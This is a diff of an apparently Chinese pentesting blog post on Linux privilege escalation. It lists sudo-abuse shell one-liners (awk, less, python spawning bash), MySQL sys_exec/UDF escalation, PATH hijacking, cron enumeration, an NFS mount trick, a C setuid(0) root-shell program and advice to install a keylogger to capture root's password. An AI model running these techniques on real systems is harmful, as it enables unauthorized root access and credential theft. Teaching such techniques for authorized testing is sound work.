@@ -104,17 +104,17 @@
 
 
 
-<meta name="description" content="brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等。 这节中我们主要介绍一些常见的linux的权限提升的技巧这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装载的文件系">
+<meta name="description" content="brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。 这节中我们主要介绍一些常见的linux的权限提升的技巧这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装载的文件">
 <meta name="keywords">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux权限提升">
 <meta property="og:url" content="http://kevien.github.io/2017/10/10/linux权限提升/index.html">
 <meta property="og:site_name" content="M0rk's Blog">
-<meta property="og:description" content="brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等。 这节中我们主要介绍一些常见的linux的权限提升的技巧这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装载的文件系">
-<meta property="og:updated_time" content="2018-11-26T09:08:17.215Z">
+<meta property="og:description" content="brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。 这节中我们主要介绍一些常见的linux的权限提升的技巧这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装载的文件">
+<meta property="og:updated_time" content="2018-11-26T10:53:27.416Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="linux权限提升">
-<meta name="twitter:description" content="brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等。 这节中我们主要介绍一些常见的linux的权限提升的技巧这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装载的文件系">
+<meta name="twitter:description" content="brief 当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。 这节中我们主要介绍一些常见的linux的权限提升的技巧这其中包括1.内核提权2.以root权限运行的程序3.已安装的软件4.弱口令和明文密码5.内部的服务6.suid的错误配置7.滥用sudo权限8.以root权限运行的脚本文件9.错误的路径配置10.计划任务11.未装载的文件">
 
 
 
@@ -393,7 +393,7 @@
 
       
         <h2 id="brief"><a href="#brief" class="headerlink" title="brief"></a>brief</h2><ul>
-<li>当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等。</li>
+<li>当我们获取到一个低权限的shell的时候，我们需要提升我们的权限，以方便后面任意读写任意文件、权限维持等等。</li>
 <li>这节中我们主要介绍一些常见的linux的权限提升的技巧<br>这其中包括<br>1.内核提权<br>2.以root权限运行的程序<br>3.已安装的软件<br>4.弱口令和明文密码<br>5.内部的服务<br>6.suid的错误配置<br>7.滥用sudo权限<br>8.以root权限运行的脚本文件<br>9.错误的路径配置<br>10.计划任务<br>11.未装载的文件系统<h2 id="枚举脚本"><a href="#枚举脚本" class="headerlink" title="枚举脚本"></a>枚举脚本</h2></li>
 <li>我之前用三个脚本来枚举一个机器的基本信息，这三个脚本有些不同，但是输出都很相似，所以选择一个你喜欢的就可以。<br><a href="https://github.com/rebootuser/LinEnum" target="_blank" rel="external">LinEnum</a></li>
 <li>以下是基本的选项：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-k Enter keyword</div><div class="line">-e Enter export location</div><div class="line">-t Include thorough (lengthy) tests</div><div class="line">-r Enter report name</div><div class="line">-h Displays this help text</div></pre></td></tr></table></figure>
@@ -407,18 +407,18 @@
 </ul>
 <h3 id="查找exploit"><a href="#查找exploit" class="headerlink" title="查找exploit"></a>查找exploit</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">site:exploit-db.com kernel version</div><div class="line"></div><div class="line">python linprivchecker.py extended</div></pre></td></tr></table></figure>
 <ul>
-<li>能不用内核漏洞提权尽量就不要用，因为他可能会导致系统崩溃或者使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中，<h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
-<li>这个方法的原理就是如果一个IE服务是以root权限运行的，那么你可以让这个服务去执行命令，那么执行的这个命令也将会是以root权限运行的，查看web服务器、数据库或者其它的服务，典型的例子然是<br>mysql的，如下：</li>
+<li>能不用内核漏洞提权尽量就不要用，因为他可能会导致系统崩溃或者使系统处于一个不稳定的状态，且还会产生大量的日志信息在sys.log 文件中。<h2 id="以root权限运行的程序"><a href="#以root权限运行的程序" class="headerlink" title="以root权限运行的程序"></a>以root权限运行的程序</h2></li>
+<li>这个方法的原理就是如果一个服务是以root权限运行的，那么你可以让这个服务去执行命令，那么执行的这个命令也将会是以root权限运行的，查看web服务器、数据库或者其它的服务，典型的例子然是<br>mysql的，如下：</li>
 <li>查看有哪些正在运行的程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"># Metasploit</div><div class="line">ps</div><div class="line"></div><div class="line"># Linux</div><div class="line">ps aux</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><ul>
-<li>如果你发现mysql是你root权限运行的，登录到mysql然后执行下面的命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select sys_exec(&apos;whoami&apos;);</div><div class="line">select sys_eval(&apos;whoami&apos;);</div></pre></td></tr></table></figure>
+<li>如果你发现mysql是以root权限运行的，登录到mysql然后执行下面的命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select sys_exec(&apos;whoami&apos;);</div><div class="line">select sys_eval(&apos;whoami&apos;);</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<p>如果这个不行你可以使用UDF进行提权.<a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="external">UDF提权</a></p>
+<p>如果这个不行可以使用UDF进行提权.<a href="https://infamoussyn.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/" target="_blank" rel="external">UDF提权</a></p>
 <h2 id="用户安装的软件"><a href="#用户安装的软件" class="headerlink" title="用户安装的软件"></a>用户安装的软件</h2><ul>
-<li>用户安装的第三方软件是否是存在漏洞的，如果有的话可以google一下exploit。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># Common locations for user installed software</div><div class="line">/usr/local/</div><div class="line">/usr/local/src</div><div class="line">/usr/local/bin</div><div class="line">/opt/</div><div class="line">/home</div><div class="line">/var/</div><div class="line">/usr/src/</div><div class="line"></div><div class="line"># Debian</div><div class="line">dpkg -l</div><div class="line"></div><div class="line"># CentOS, OpenSuse, Fedora, RHEL</div><div class="line">rpm -qa (CentOS / openSUSE )</div><div class="line"></div><div class="line"># OpenBSD, FreeBSD</div><div class="line">pkg_info</div></pre></td></tr></table></figure>
+<li>用户安装的第三方软件是否是存在漏洞的，如果有的话可以google一下exploit。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"># 常见的安装软件目录</div><div class="line">/usr/local/</div><div class="line">/usr/local/src</div><div class="line">/usr/local/bin</div><div class="line">/opt/</div><div class="line">/home</div><div class="line">/var/</div><div class="line">/usr/src/</div><div class="line"></div><div class="line"># Debian</div><div class="line">dpkg -l</div><div class="line"></div><div class="line"># CentOS, OpenSuse, Fedora, RHEL</div><div class="line">rpm -qa (CentOS / openSUSE )</div><div class="line"></div><div class="line"># OpenBSD, FreeBSD</div><div class="line">pkg_info</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="弱口令或者明文密码"><a href="#弱口令或者明文密码" class="headerlink" title="弱口令或者明文密码"></a>弱口令或者明文密码</h2><ul>
@@ -441,31 +441,45 @@
 </li>
 </ul>
 <h2 id="滥用sudo权限"><a href="#滥用sudo权限" class="headerlink" title="滥用sudo权限"></a>滥用sudo权限</h2><ul>
-<li>如果你的shell可以通过sudo 去访问某些程序，这个时候就有可能提升你的权限，例如如果你可以sudo cp，那么你就可以覆盖/etc/shadow 或者/etc/sudoers </li>
+<li>如果你的shell可以通过sudo去访问某些程序且无需密码，这个时候就有可能提升你的权限，例如如果你可以sudo cp，那么你就可以覆盖/etc/shadow 或者/etc/sudoers </li>
 <li>这些命令有 awk、bash、cp等</li>
 <li><p>awk</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos;</div></pre></td></tr></table></figure>
 </li>
-<li><p>find</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo find / -exec bash -i \;</div><div class="line"></div><div class="line">find / -exec /usr/bin/awk &apos;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&apos; ;</div></pre></td></tr></table></figure>
-</li>
 <li><p>less</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo less /etc/shadow</div><div class="line">v</div><div class="line">:shell</div></pre></td></tr></table></figure>
+</li>
+<li><p>nmap</p>
+</li>
+<li>python<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo python</div><div class="line">import os</div><div class="line">os.system(&quot;/bin/bash&quot;)</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><a href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/" target="_blank" rel="external">更多参考</a></p>
 <h2 id="以root权限运行的脚本文件"><a href="#以root权限运行的脚本文件" class="headerlink" title="以root权限运行的脚本文件"></a>以root权限运行的脚本文件</h2><ul>
-<li>如果你发现一个脚本是root所有但是可以被任何用户写，这个可以你就可以添加你恶意的代码到这脚本中从而实现提权操作。这些脚本可能是计划任务。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
+<li>如果你发现一个脚本是root所有但是可以被任何用户写，这时你就可以添加你恶意的代码到这脚本中从而实现提权操作。这些脚本可能是计划任务。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">#World writable files directories</div><div class="line">find / -writable -type d 2&gt;/dev/null</div><div class="line">find / -perm -222 -type d 2&gt;/dev/null</div><div class="line">find / -perm -o w -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World executable folder</div><div class="line">find / -perm -o x -type d 2&gt;/dev/null</div><div class="line"></div><div class="line"># World writable and executable folders</div><div class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null</div></pre></td></tr></table></figure>
 </li>
 </ul>
-<h2 id="错误的路径配置"><a href="#错误的路径配置" class="headerlink" title="错误的路径配置"></a>错误的路径配置</h2><p><a href="https://hackmag.com/security/reach-the-root/" target="_blank" rel="external">link1</a><br><a href="http://www.dankalia.com/tutor/01005/0100501004.htm" target="_blank" rel="external">link2</a></p>
-<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><ul>
+<h2 id="错误的路径配置"><a href="#错误的路径配置" class="headerlink" title="错误的路径配置"></a>错误的路径配置</h2><ul>
+<li>这个trick不是很常见。</li>
+<li>首先这个需要受害者“错误”配置了 PATH这个环境变量，我们知道我们要在当前路径下执行某个可执行文件比如run.sh,我们需要输入 ./run.sh，有些管理员为了方便，可能会在PATH中添加.来避免输入./,</li>
+<li>这样只输入run.sh 就可以执行了。设想有这个一个场景，黑客A（地权限）和用户B（高权限），而用户B正好就设置了我们如上所说的变量，那么A可以将他的恶意程序命令为ls，而当B在进入到这个目录，并且</li>
+<li>使用ls命令查看文件属性的时候，恶意文件就会以B用户的权限去执行。这个有点儿像是欺骗攻击。<br><a href="https://hackmag.com/security/reach-the-root/" target="_blank" rel="external">更多1</a><br><a href="http://www.dankalia.com/tutor/01005/0100501004.htm" target="_blank" rel="external">更多2</a><h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2></li>
 <li>查看属于高权限用户但是你有写权限的文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">crontab -l</div><div class="line">ls -alh /var/spool/cron</div><div class="line">ls -al /etc/ | grep cron</div><div class="line">ls -al /etc/cron*</div><div class="line">cat /etc/cron*</div><div class="line">cat /etc/at.allow</div><div class="line">cat /etc/at.deny</div><div class="line">cat /etc/cron.allow</div><div class="line">cat /etc/cron.deny</div><div class="line">cat /etc/crontab</div><div class="line">cat /etc/anacrontab</div><div class="line">cat /var/spool/cron/crontabs/root</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="未挂载的文件系统"><a href="#未挂载的文件系统" class="headerlink" title="未挂载的文件系统"></a>未挂载的文件系统</h2><ul>
-<li>查看未挂载的系统磁盘，如果成功挂载之后，那么就可以从头开始检查一下权限提升的步骤。<h2 id="NFS共享"><a href="#NFS共享" class="headerlink" title="NFS共享"></a>NFS共享</h2><h2 id="通过键盘记录仪窃取密码"><a href="#通过键盘记录仪窃取密码" class="headerlink" title="通过键盘记录仪窃取密码"></a>通过键盘记录仪窃取密码</h2></li>
-<li>如果你有sudo权限 但是你没有密码这个时候你可以安装个键盘记录仪。<h2 id="其它有用的和提权相关的东西"><a href="#其它有用的和提权相关的东西" class="headerlink" title="其它有用的和提权相关的东西"></a>其它有用的和提权相关的东西</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/tmp</div><div class="line">/var/tmp</div><div class="line">/dev/shm</div><div class="line">/var/spool/vbox</div><div class="line">/var/spool/samba</div></pre></td></tr></table></figure>
+<li>查看未挂载的系统磁盘，如果成功挂载之后，那么就可以从头开始检查一下权限提升的步骤。<h2 id="NFS共享"><a href="#NFS共享" class="headerlink" title="NFS共享"></a>NFS共享</h2></li>
+<li><p>如果远程服务器开启了NFS共享，这个时候可以挂在远程共享服务磁盘，例如 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mount 192.168.1.101:/ /tmp/</div></pre></td></tr></table></figure>
+</li>
+<li><p>而如果这里的文件是root用户创建的，且你是可写的，那么你就可以修改这个文件，然后去执行。</p>
+</li>
+<li>恶意代码可能是这样的<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;</div><div class="line">    setuid(0);</div><div class="line">    system(&quot;/bin/bash&quot;);</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="通过键盘记录仪窃取密码"><a href="#通过键盘记录仪窃取密码" class="headerlink" title="通过键盘记录仪窃取密码"></a>通过键盘记录仪窃取密码</h2><ul>
+<li>如果你有sudo权限 但是你没有密码的时候你可以安装个键盘记录仪，去记录root用户输入的密码。<h2 id="其它有用的和提权相关的东西"><a href="#其它有用的和提权相关的东西" class="headerlink" title="其它有用的和提权相关的东西"></a>其它有用的和提权相关的东西</h2></li>
+<li>所有人可写的目录<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">/tmp</div><div class="line">/var/tmp</div><div class="line">/dev/shm</div><div class="line">/var/spool/vbox</div><div class="line">/var/spool/samba</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <h2 id="提权工具"><a href="#提权工具" class="headerlink" title="提权工具"></a>提权工具</h2><p><a href="https://github.com/pentestmonkey/unix-privesc-check" target="_blank" rel="external">unix-privesc-check</a></p>
